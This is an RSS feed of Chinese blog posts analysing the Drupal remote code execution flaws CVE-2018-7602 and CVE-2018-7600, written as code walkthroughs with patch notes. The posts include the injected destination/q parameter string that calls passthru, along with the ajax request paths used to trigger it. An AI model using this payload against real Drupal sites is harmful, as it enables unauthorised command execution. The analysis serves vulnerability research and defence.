<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Sec on 诗与胡说</title>
    <link>https://kylingit.com/tags/sec/index.xml</link>
    <description>Recent content in Sec on 诗与胡说</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh_cn</language>
    <copyright>Copyright © 2018 kylinking</copyright>
    <atom:link href="https://kylingit.com/tags/sec/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>CVE-2018-7602 Drupal 内核远程代码执行漏洞分析</title>
      <link>https://kylingit.com/blog/cve-2018-7602-drupal-%E5%86%85%E6%A0%B8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
      <pubDate>Thu, 26 Apr 2018 17:21:11 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/cve-2018-7602-drupal-%E5%86%85%E6%A0%B8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
      <description>

&lt;h4 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h4&gt;

&lt;p&gt;&lt;a href=&#34;https://www.drupal.org/sa-core-2018-004&#34;&gt;https://www.drupal.org/sa-core-2018-004&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;这个漏洞是&lt;code&gt;CVE-2018-7600&lt;/code&gt;的另一个利用点，两个漏洞原理是一样的&lt;/p&gt;

&lt;h4 id=&#34;0x02-影响版本&#34;&gt;0x02 影响版本&lt;/h4&gt;

&lt;p&gt;Drupal 6.x，7.x，8.x&lt;/p&gt;

&lt;p&gt;修复版本
Drupal 7.59，Drupal 8.4.8，Drupal 8.5.3&lt;/p&gt;

&lt;h4 id=&#34;0x03-环境搭建&#34;&gt;0x03 环境搭建&lt;/h4&gt;

&lt;p&gt;历史版本
&lt;a href=&#34;https://www.drupal.org/project/drupal/releases&#34;&gt;https://www.drupal.org/project/drupal/releases&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x04-漏洞分析&#34;&gt;0x04 漏洞分析&lt;/h4&gt;

&lt;p&gt;分析还是以7.57版本为例。跟7600漏洞的7.x版本很相似，只不过入口不一样，可以参考&lt;a href=&#34;http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/&#34;&gt;http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;上回漏洞的关键点是让系统缓存一个&lt;code&gt;form_build_id&lt;/code&gt;，这个form存着我们传入的恶意参数，第二个请求从中取出来然后执行。
这次的原理还是一样，触发漏洞还是需要发两个post包，一个存入&lt;code&gt;form_build_id&lt;/code&gt;一个取出后执行。&lt;/p&gt;

&lt;p&gt;这次的问题出在删除文章的时候，我们先走一遍正常删除文章的逻辑&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/VGL3Y&#34; alt=&#34;delete&#34; /&gt;
请求中每个node即代表一篇文章。
可以看到是会重定向到文章页面的，根据上个漏洞的分析我们猜测，一定还是走到了&lt;code&gt;drupal_redirect_form()&lt;/code&gt;，我们已经知道如果走到&lt;code&gt;drupal_redirect_form()&lt;/code&gt;分支，是不会往数据库缓存&lt;code&gt;form_build_id&lt;/code&gt;的，我们的目的还是让程序不满足一定条件从而不进行表单提交后重定向，所以还是跟着&lt;code&gt;CVE-2018-7600&lt;/code&gt;的套路来走&lt;/p&gt;

&lt;p&gt;从代码层面看一下&lt;/p&gt;

&lt;p&gt;之前的流程还是一样，直接跳到&lt;code&gt;drupal_build_form()&lt;/code&gt;方法第386行&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;drupal_process_form($form_id, $form, $form_state);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;跟入&lt;code&gt;drupal_process_form()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/w0cQZ&#34; alt=&#34;drupal_process_form&#34; /&gt;
还是一样，&lt;code&gt;$form_state[&#39;submitted&#39;]&lt;/code&gt;被设置为true&lt;/p&gt;

&lt;p&gt;回到902行&lt;/p&gt;

&lt;p&gt;&lt;code&gt;if ($form_state[&#39;submitted&#39;] &amp;amp;&amp;amp; !form_get_errors() &amp;amp;&amp;amp; !$form_state[&#39;rebuild&#39;])&lt;/code&gt;
条件被满足，进入这个分支便会执行&lt;code&gt;drupal_redirect_form()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/aoYne&#34; alt=&#34;drupal_redirect_form&#34; /&gt;&lt;/p&gt;

&lt;p&gt;而在这一步之前需要经过的判断是&lt;code&gt;_form_element_triggered_scripted_submission()&lt;/code&gt;
所以回到一开始的问题，构造一个&lt;code&gt;_triggering_element_value&lt;/code&gt;使得键值对相等，从而不进行rebuild&lt;/p&gt;

&lt;p&gt;我们传入&lt;code&gt;_triggering_element_name=form_id&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/UBCWM&#34; alt=&#34;post&#34; /&gt;
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/Rbrm4&#34; alt=&#34;form_id&#34; /&gt;
可以看到条件被满足，&lt;code&gt;$form_state[&#39;submitted&#39;]&lt;/code&gt;没有被设置为true，还是保持默认值false&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/UYLtu&#34; alt=&#34;submitted&#34; /&gt;
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/o98bE&#34; alt=&#34;submitted&#34; /&gt;&lt;/p&gt;

&lt;p&gt;进入&lt;code&gt;drupal_rebuild_form()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/WdeFV&#34; alt=&#34;drupal_rebuild_form&#34; /&gt;
表单被缓存&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/MCCPJ&#34; alt=&#34;form_set_cache&#34; /&gt;
&lt;img src=&#34;http://ob5vt1k7f.qnssl.com/U5Tej&#34; alt=&#34;cache_form&#34; /&gt;&lt;/p&gt;

&lt;p&gt;然后我们发送第二个post包来取出我们构造好的form，向&lt;strong&gt;&lt;code&gt;file/ajax/actions/cancel/%23options/path&lt;/code&gt;&lt;/strong&gt;发起请求&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/voiue&#34; alt=&#34;post2&#34; /&gt;&lt;/p&gt;

&lt;p&gt;参数传递进去&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/luJMk&#34; alt=&#34;file_ajax_upload&#34; /&gt;
最终还是跟入到
&lt;code&gt;$output = drupal_render($form);&lt;/code&gt;
根据前几次的经验，我们还是选择&lt;code&gt;&#39;#post_render&#39;&lt;/code&gt;参数，&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/GV3Rc&#34; alt=&#34;post_render&#34; /&gt;
假如我们能控制这个参数，在&lt;code&gt;drupal_render()&lt;/code&gt;方法里就会把这个参数作为&lt;code&gt;$function&lt;/code&gt;函数名，而传给它的参数则是&lt;code&gt;[%23markup]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;所以问题回到了一开始，我们需要传递什么样的恶意参数，可以让系统直接接收而不经过过滤，还是之前的套路，搜索module下删除文章的相关操作&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/niMWz&#34; alt=&#34;node_form_delete_submit&#34; /&gt;
可以看到&lt;code&gt;node_form_delete_submit()&lt;/code&gt;方法从get方法直接接收参数&lt;code&gt;destination&lt;/code&gt;，与最初分析正常删除文章的参数正是同一个，那么我们就可以利用&lt;code&gt;destination&lt;/code&gt;传进恶意参数&lt;/p&gt;

&lt;p&gt;构造如下
&lt;strong&gt;&lt;code&gt;destination=a?q[%2523post_render][]=passthru%26q[%23type]=markup%26q[%23markup]=dir&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;a&lt;/code&gt;参数是次要的，主要是&lt;code&gt;q&lt;/code&gt;参数，因为在&lt;code&gt;includes/common.inc&lt;/code&gt;的&lt;code&gt;drupal_parse_url()&lt;/code&gt;方法&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (isset($options[&#39;query&#39;][&#39;q&#39;])) {
    $options[&#39;path&#39;] = $options[&#39;query&#39;][&#39;q&#39;];
    unset($options[&#39;query&#39;][&#39;q&#39;]);
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从q取出值赋给&lt;code&gt;$options[&#39;path&#39;]&lt;/code&gt;，也就是a被覆盖了，这个时候的&lt;code&gt;$options[&#39;path&#39;]&lt;/code&gt;就是我们传入的数组&lt;/p&gt;

&lt;p&gt;注意q的元素需要转义百分号，不然会被认为&lt;code&gt;q[&lt;/code&gt;是一个值&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/s4o7s&#34; alt=&#34;options&#34; /&gt;
参数缓存进整个form后通过第二个请求取出，同样经过&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;foreach ($form_parents as $parent) {
    $form = $form[$parent];
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;遍历叶子节点取出参数&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/Wgz3w&#34; alt=&#34;parent&#34; /&gt;
进入&lt;code&gt;drupal_render()&lt;/code&gt;执行&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/SsmNM&#34; alt=&#34;passthru&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x05-poc&#34;&gt;0x05 PoC&lt;/h4&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/j1Yn4&#34; alt=&#34;PoC&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/P0AEw&#34; alt=&#34;PoC&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x06-补丁&#34;&gt;0x06 补丁&lt;/h4&gt;

&lt;p&gt;7.x的补丁&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/drupal/drupal/commit/080daa38f265ea28444c540832509a48861587d0&#34;&gt;https://github.com/drupal/drupal/commit/080daa38f265ea28444c540832509a48861587d0&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/2Zhjq&#34; alt=&#34;patch&#34; /&gt;
其中一个重要操作就是对&lt;code&gt;destination&lt;/code&gt;参数进行了净化&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://ob5vt1k7f.qnssl.com/CaZPF&#34; alt=&#34;cleanDestination&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x07-总结&#34;&gt;0x07 总结&lt;/h4&gt;

&lt;p&gt;总的来说这个漏洞是CVE-2018-7600的另一个利用点，只是入口方式不一样，最终执行点还是相同的，所以还是那句话，一旦参数可控并且没有经过正确的过滤，就很有可能出问题。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>CVE-2018-7600 Drupal 7.x 版本代码执行漏洞分析</title>
      <link>https://kylingit.com/blog/cve-2018-7600-drupal-7.x-%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
      <pubDate>Fri, 20 Apr 2018 23:05:34 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/cve-2018-7600-drupal-7.x-%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
      <description>

&lt;h4 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h4&gt;

&lt;p&gt;CVE-2018-7600影响范围包括了Drupal 6.x，7.x，8.x版本，前几天8.x版本的PoC出来之后大家都赶紧分析了一波，然后热度似乎慢慢退去了。两天前&lt;a href=&#34;https://github.com/dreadlocked/Drupalgeddon2&#34;&gt;Drupalgeddon2&lt;/a&gt;项目更新了7.x版本的exp，实际环境也出现了利用，下面就简单来看一下&lt;/p&gt;

&lt;p&gt;看到项目上这样写&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Drupal &amp;lt; 7.58 ~ user/password URL, attacking triggering_element_name form &amp;amp; #post_render parameter, using PHP&amp;rsquo;s passthru function&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;提示了问题出在&lt;code&gt;user/password&lt;/code&gt;路径下，通过&lt;code&gt;#post_render&lt;/code&gt;传递恶意参数，问题出现在&lt;code&gt;triggering_element_name&lt;/code&gt;表单处理下&lt;/p&gt;

&lt;h4 id=&#34;0x02-漏洞分析&#34;&gt;0x02 漏洞分析&lt;/h4&gt;

&lt;p&gt;我们从三个问题入手，为什么PoC发了两个包，第二次请求为什么要带上一个&lt;code&gt;form_build_id&lt;/code&gt;，以及为什么选择&lt;code&gt;user/password&lt;/code&gt;这个入口&lt;/p&gt;

&lt;p&gt;先分析第一个post，照例还是先看一下Drupal 7的表单处理流程，跟8版本不太一样，但是入口还是相似的。
根据文档描述，当我们提交一个表单(例如找回密码)时，系统会通过&lt;code&gt;form_builder()&lt;/code&gt;方法创建一个form
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/lffx4.jpg&#34; alt=&#34;user/passwd&#34; /&gt;
一系列预处理后，会由&lt;code&gt;drupal_build_form
()&lt;/code&gt;方法创建一个表单，在第386行调用&lt;code&gt;drupal_process_form()&lt;/code&gt;方法，
跟进&lt;code&gt;drupal_process_form()&lt;/code&gt;方法，这时候默认的&lt;code&gt;$form_state[&#39;submitted&#39;]&lt;/code&gt;为false&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/dd7fx.png&#34; alt=&#34;submitted&#34; /&gt;
不满足if条件，&lt;code&gt;$form_state[&#39;submitted&#39;]&lt;/code&gt;被设置为true&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/kqijr.png&#34; alt=&#34;true&#34; /&gt;
于是进入这个分支，最终被&lt;code&gt;drupal_redirect_form&lt;/code&gt;重定向&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/so5l4.jpg&#34; alt=&#34;drupal_redirect_form&#34; /&gt;&lt;/p&gt;

&lt;p&gt;我们的目的是要让系统缓存一个&lt;code&gt;form_build_id&lt;/code&gt;，以便后面拿出来用。要想form被缓存，就得想办法让&lt;code&gt;if ($form_state[&#39;submitted&#39;] &amp;amp;&amp;amp; !form_get_errors() &amp;amp;&amp;amp; !$form_state[&#39;rebuild&#39;])&lt;/code&gt;不成立，也就是说要使&lt;code&gt;$form_state[&#39;submitted&#39;]&lt;/code&gt;为false
从而进入下面的&lt;code&gt;drupal_rebuild_form&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;那么如何让&lt;code&gt;$form_state[&#39;submitted&#39;]&lt;/code&gt;为false呢？&lt;/p&gt;

&lt;p&gt;在&lt;code&gt;includes/form.inc&lt;/code&gt;第886行
&lt;code&gt;$form = form_builder($form_id, $form, $form_state);&lt;/code&gt;
跟进&lt;code&gt;form_builder&lt;/code&gt;方法，第1987行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (!empty($form_state[&#39;triggering_element&#39;][&#39;#executes_submit_callback&#39;])) {
  $form_state[&#39;submitted&#39;] = TRUE;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;当&lt;code&gt;$form_state[&#39;triggering_element&#39;][&#39;#executes_submit_callback&#39;]&lt;/code&gt;存在值的时候就为true，那么我们就想办法让这个值为空
往上看第1972行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (!$form_state[&#39;programmed&#39;] &amp;amp;&amp;amp; !isset($form_state[&#39;triggering_element&#39;]) &amp;amp;&amp;amp; !empty($form_state[&#39;buttons&#39;])) {
  $form_state[&#39;triggering_element&#39;] = $form_state[&#39;buttons&#39;][0];
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果没有设置&lt;code&gt;$form_state[&#39;triggering_element&#39;]&lt;/code&gt;，那么&lt;code&gt;$form_state[&#39;triggering_element&#39;]&lt;/code&gt;就设置为第一个button的值，所以正常传递表单的时候&lt;code&gt;$form_state[&#39;triggering_element&#39;][&#39;#executes_submit_callback&#39;]&lt;/code&gt;就总会有值&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1do73.jpg&#34; alt=&#34;button&#34; /&gt;&lt;/p&gt;

&lt;p&gt;现在问题来了，如何构造一个form能够确保&lt;code&gt;$form_state[&#39;triggering_element&#39;][&#39;#executes_submit_callback&#39;]&lt;/code&gt;为空或者说不存在这个数组呢？&lt;/p&gt;

&lt;p&gt;我们注意到第1864行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (!empty($element[&#39;#input&#39;])) {
  _form_builder_handle_input_element($form_id, $element, $form_state);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;_form_builder_handle_input_element()&lt;/code&gt;方法对表单先进行了处理，跟进去看一下&lt;/p&gt;

&lt;p&gt;第2144行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;// Determine which element (if any) triggered the submission of the form and
// keep track of all the clickable buttons in the form for
// form_state_values_clean(). Enforce the same input processing restrictions
// as above.
if ($process_input) {
  // Detect if the element triggered the submission via Ajax.
  if (_form_element_triggered_scripted_submission($element, $form_state)) {
    $form_state[&#39;triggering_element&#39;] = $element;
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里&lt;code&gt;$form_state[&#39;triggering_element&#39;]&lt;/code&gt;被设置为&lt;code&gt;$element&lt;/code&gt;，前提是满足&lt;code&gt;_form_element_triggered_scripted_submission()&lt;/code&gt;方法，继续跟入
第2180行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function _form_element_triggered_scripted_submission($element, &amp;amp;$form_state) {
  if (!empty($form_state[&#39;input&#39;][&#39;_triggering_element_name&#39;]) &amp;amp;&amp;amp; $element[&#39;#name&#39;] == $form_state[&#39;input&#39;][&#39;_triggering_element_name&#39;]) {
    if (empty($form_state[&#39;input&#39;][&#39;_triggering_element_value&#39;]) || $form_state[&#39;input&#39;][&#39;_triggering_element_value&#39;] == $element[&#39;#value&#39;]) {
      return TRUE;
    }
  }
  return FALSE;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个方法的意思是说如果&lt;code&gt;_triggering_element_value&lt;/code&gt;和&lt;code&gt;$element&lt;/code&gt;的键值都相等的话，返回true
&lt;code&gt;$form_state[&#39;triggering_element&#39;]&lt;/code&gt;赋值为&lt;code&gt;$element&lt;/code&gt;，其中不含&lt;code&gt;[&#39;#executes_submit_callback&#39;]&lt;/code&gt;，一开始的条件就成立了&lt;/p&gt;

&lt;p&gt;根据PoC，我们传入&lt;code&gt;_triggering_element_name=name&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/3c6kh.jpg&#34; alt=&#34;element&#34; /&gt;
看到进入这个分支，进入&lt;code&gt;form_set_cache()&lt;/code&gt;方法&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/cn1jh.jpg&#34; alt=&#34;&#34; /&gt;
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/lskgu.png&#34; alt=&#34;&#34; /&gt;
数据库中插入缓存&lt;code&gt;form_build_id&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/odfo8.png&#34; alt=&#34;&#34; /&gt;
成功写入缓存&lt;/p&gt;

&lt;p&gt;接下去来看一下这个缓存有什么用&lt;/p&gt;

&lt;p&gt;分析PoC的第二个包，请求参数是这样&lt;code&gt;q=file/ajax/name/%23value/form_build_id&lt;/code&gt;
&lt;code&gt;form_build_id&lt;/code&gt;即我们上一个写入数据库的缓存表单&lt;/p&gt;

&lt;p&gt;首先请求会进入&lt;code&gt;includes/menu.inc&lt;/code&gt;的&lt;code&gt;menu_get_item()&lt;/code&gt;方法，&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function menu_get_item($path = NULL, $router_item = NULL) {
  $router_items = &amp;amp;drupal_static(__FUNCTION__);
  if (!isset($path)) {
    $path = $_GET[&#39;q&#39;];
  }
  if (isset($router_item)) {
    $router_items[$path] = $router_item;
  }
  if (!isset($router_items[$path])) {
    // Rebuild if we know it&#39;s needed, or if the menu masks are missing which
    // occurs rarely, likely due to a race condition of multiple rebuilds.
    if (variable_get(&#39;menu_rebuild_needed&#39;, FALSE) || !variable_get(&#39;menu_masks&#39;, array())) {
      if (_menu_check_rebuild()) {
        menu_rebuild();
      }
    }
    $original_map = arg(NULL, $path);

    $parts = array_slice($original_map, 0, MENU_MAX_PARTS);
    $ancestors = menu_get_ancestors($parts);
    $router_item = db_query_range(&#39;SELECT * FROM {menu_router} WHERE path IN (:ancestors) ORDER BY fit DESC&#39;, 0, 1, array(&#39;:ancestors&#39; =&amp;gt; $ancestors))-&amp;gt;fetchAssoc();

    if ($router_item) {
      // Allow modules to alter the router item before it is translated and
      // checked for access.
      drupal_alter(&#39;menu_get_item&#39;, $router_item, $path, $original_map);

      $map = _menu_translate($router_item, $original_map);
      $router_item[&#39;original_map&#39;] = $original_map;
      if ($map === FALSE) {
        $router_items[$path] = FALSE;
        return FALSE;
      }
      if ($router_item[&#39;access&#39;]) {
        $router_item[&#39;map&#39;] = $map;
        $router_item[&#39;page_arguments&#39;] = array_merge(menu_unserialize($router_item[&#39;page_arguments&#39;], $map), array_slice($map, $router_item[&#39;number_parts&#39;]));
        $router_item[&#39;theme_arguments&#39;] = array_merge(menu_unserialize($router_item[&#39;theme_arguments&#39;], $map), array_slice($map, $router_item[&#39;number_parts&#39;]));
      }
    }
    $router_items[$path] = $router_item;
  }
  return $router_items[$path];
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;$path&lt;/code&gt;即我们传进去的q参数，经过一系列处理传给&lt;code&gt;menu_get_ancestors()&lt;/code&gt;方法，该方法把path重新组合成一堆router，也就是Drupal处理路由到具体url的传参方式，最终被&lt;code&gt;db_query_range()&lt;/code&gt;带入数据库查询
我们关注查询结果&lt;code&gt;$router_item&lt;/code&gt;的&lt;code&gt;page_callback&lt;/code&gt;值，因为这个值最终会作为参数被带入&lt;code&gt;call_user_func_array()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if ($page_callback_result == MENU_SITE_ONLINE) {
  if ($router_item = menu_get_item($path)) {
    if ($router_item[&#39;access&#39;]) {
      if ($router_item[&#39;include_file&#39;]) {
        require_once DRUPAL_ROOT . &#39;/&#39; . $router_item[&#39;include_file&#39;];
      }
      $page_callback_result = call_user_func_array($router_item[&#39;page_callback&#39;], $router_item[&#39;page_arguments&#39;]);
    }
    else {
      $page_callback_result = MENU_ACCESS_DENIED;
    }
  }
  else {
    $page_callback_result = MENU_NOT_FOUND;
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/qvqwz.png&#34; alt=&#34;call_user_func_array&#34; /&gt;
到这里就跟8版本的情况有点类似了&lt;/p&gt;

&lt;p&gt;跟入回调函数&lt;code&gt;file_ajax_upload()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/tij37.jpg&#34; alt=&#34;file_ajax_upload&#34; /&gt;
还是一样，把&lt;code&gt;$form_parents&lt;/code&gt;完整取出赋值给&lt;code&gt;$form&lt;/code&gt;，加上一些前缀后缀后最终进入&lt;code&gt;drupal_render()&lt;/code&gt;方法&lt;/p&gt;

&lt;p&gt;最终得到执行&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/rpwrs.jpg&#34; alt=&#34;passthru&#34; /&gt;&lt;/p&gt;

&lt;p&gt;到目前为止我们分析清楚了为什么PoC要发两次包，以及第二次请求为什么要带上一个&lt;code&gt;form_build_id&lt;/code&gt;，现在来想一想为什么要请求&lt;code&gt;user/password&lt;/code&gt;这个路径呢？
在user这个module下的&lt;code&gt;user_pass()&lt;/code&gt;方法&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function user_pass() {
  global $user;

  $form[&#39;name&#39;] = array(
    &#39;#type&#39; =&amp;gt; &#39;textfield&#39;,
    &#39;#title&#39; =&amp;gt; t(&#39;Username or e-mail address&#39;),
    &#39;#size&#39; =&amp;gt; 60,
    &#39;#maxlength&#39; =&amp;gt; max(USERNAME_MAX_LENGTH, EMAIL_MAX_LENGTH),
    &#39;#required&#39; =&amp;gt; TRUE,
    &#39;#default_value&#39; =&amp;gt; isset($_GET[&#39;name&#39;]) ? $_GET[&#39;name&#39;] : &#39;&#39;,
  );
  ...
  return $form;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看到这里是不是感觉跟8版本很相似，&lt;code&gt;#default_value&lt;/code&gt;从get的&lt;code&gt;name&lt;/code&gt;参数里取值，而name可以作为数组传入，它的属性在下面正好可以被利用，一个巧妙的利用链就串起来了。&lt;/p&gt;

&lt;h4 id=&#34;0x03-总结&#34;&gt;0x03 总结&lt;/h4&gt;

&lt;p&gt;Drupal 7.x的利用比8.x要复杂一些，但触发点和一开始的风险因素还是类似的，一是接收参数过滤不当，而是可控参数进入危险方法。官方补丁把入口处的&lt;code&gt;#&lt;/code&gt;全给过滤了，简单粗暴又有效，估计再利用框架本身的特性想传递进一些数组或元素就很难了。&lt;/p&gt;

&lt;h4 id=&#34;0x04-参考&#34;&gt;0x04 参考&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/dreadlocked/Drupalgeddon2&#34;&gt;https://github.com/dreadlocked/Drupalgeddon2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://research.checkpoint.com/uncovering-drupalgeddon-2/&#34;&gt;https://research.checkpoint.com/uncovering-drupalgeddon-2/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>CVE-2018-7600 Drupal 内核远程代码执行漏洞分析</title>
      <link>https://kylingit.com/blog/cve-2018-7600-drupal-%E5%86%85%E6%A0%B8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
      <pubDate>Fri, 13 Apr 2018 23:05:34 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/cve-2018-7600-drupal-%E5%86%85%E6%A0%B8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
      <description>

&lt;h4 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h4&gt;

&lt;p&gt;&lt;a href=&#34;https://www.drupal.org/sa-core-2018-002&#34;&gt;https://www.drupal.org/sa-core-2018-002&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x02-影响版本&#34;&gt;0x02 影响版本&lt;/h4&gt;

&lt;p&gt;Drupal 6.x，7.x，8.x&lt;/p&gt;

&lt;p&gt;修复版本
Drupal 7.58，Drupal 8.5.1&lt;/p&gt;

&lt;h4 id=&#34;0x03-环境搭建&#34;&gt;0x03 环境搭建&lt;/h4&gt;

&lt;p&gt;历史版本
&lt;a href=&#34;https://www.drupal.org/project/drupal/releases&#34;&gt;https://www.drupal.org/project/drupal/releases&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x04-流程梳理&#34;&gt;0x04 流程梳理&lt;/h4&gt;

&lt;p&gt;先来理清一下Drupal处理表单的情况。更详细的可以看&lt;a href=&#34;http://www.thinkindrupal.com/node/1100&#34;&gt;文档&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Drupal提供了一个应用程序接口（API），用来生成、验证和处理HTML表单。表单API将表单抽象为一个嵌套数组，里面包含了属性和值。在生成页面时，表单呈现引擎会在适当的时候将数组呈现出来。&lt;/p&gt;

&lt;p&gt;模块使用关联数组向Drupal描述表单。Drupal的表单引擎负责为要显示的表单生成HTML，并使用三个阶段来安全的处理提交了的表单：验证、提交、重定向。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Drupal比较特殊，它不像大部分cms通过html直接渲染页面，而是把接收的数据交给&lt;code&gt;core/lib/Drupal/Core/Form/FormBuilder.php&lt;/code&gt;的&lt;code&gt;buildForm()&lt;/code&gt;方法处理，&lt;code&gt;buildForm()&lt;/code&gt;经过处理后返回一个结构体(数组)，数组通过引擎生成HTML。&lt;/p&gt;

